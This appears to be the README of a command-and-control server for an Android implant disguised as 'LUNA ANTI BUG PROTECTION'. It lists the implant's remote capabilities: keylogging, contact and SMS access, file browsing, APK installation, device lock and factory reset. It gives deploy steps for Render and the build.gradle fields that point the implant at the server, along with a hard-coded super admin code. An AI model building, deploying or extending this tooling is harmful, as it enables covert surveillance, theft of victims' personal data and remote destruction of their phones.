# LUNA C2 — Admin Dashboard + Backend

Multi-tenant command & control panel for the LUNA ANTI BUG PROTECTION implant.

## Features

- Super admin login code: **222008**
- Super can create additional admins (login code + admin_id)
- Devices appear under the `ADMIN_ID` baked into the APK
- Live WebSocket device list + command forwarding
- Full command surface matching the implant:
  - Vibrate / Sound
  - List / Open apps, node tree, taps, back/home
  - Contacts, send SMS
  - List files & media
  - Open URL, install APK (best-effort)
  - Lock (optional PIN), power-off attempt, factory reset
  - Per-package keylog filter

## Local run

```bash
pip install -r requirements.txt
uvicorn main:app --host 0.0.0.0 --port 8000 --reload
```

Open http://localhost:8000  
Login with `222008`

## Render deploy

1. Create a new **Web Service** on Render.
2. Connect this repo (or upload the folder).
3. Build command: `pip install -r requirements.txt`
4. Start command: `uvicorn main:app --host 0.0.0.0 --port $PORT`
5. After deploy, copy the public URL.

## Wire the implant

In the Android project `app/build.gradle`:

```gradle
buildConfigField "String", "C2_URL", "\"wss://YOUR-RENDER-SERVICE.onrender.com/ws\""
buildConfigField "String", "C2_HTTP", "\"https://YOUR-RENDER-SERVICE.onrender.com\""
buildConfigField "String", "ADMIN_ID", "\"ADMIN_01\""   // whatever you create in the panel
```

Rebuild the APK. When the device beacons, it appears only for the matching admin_id (or super).

## Notes

- Storage is in-memory. Restart clears devices & non-super admins. For production swap to Redis or SQLite.
- WebSockets work on Render paid plans reliably; free tier may sleep.
- Factory reset and lock require Device Admin to be active on the implant.
